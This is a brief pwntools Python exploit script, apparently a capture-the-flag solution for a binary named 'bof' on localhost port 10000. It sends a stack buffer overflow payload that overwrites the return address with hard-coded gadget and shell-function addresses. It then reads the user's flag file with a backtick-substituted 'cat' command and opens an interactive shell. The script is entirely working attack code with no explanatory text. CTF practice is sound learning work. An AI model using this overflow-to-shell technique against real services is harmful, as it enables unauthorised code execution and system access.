from pwn import *
import time

ip = "localhost"
port = 10000

r = remote(ip, port)
# r = process("./bof")

context.arch = "amd64"

ret = 0x400699
shell = 0x400687

r.sendlineafter(".", 'a' * 0x38 + flat(ret, shell))

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
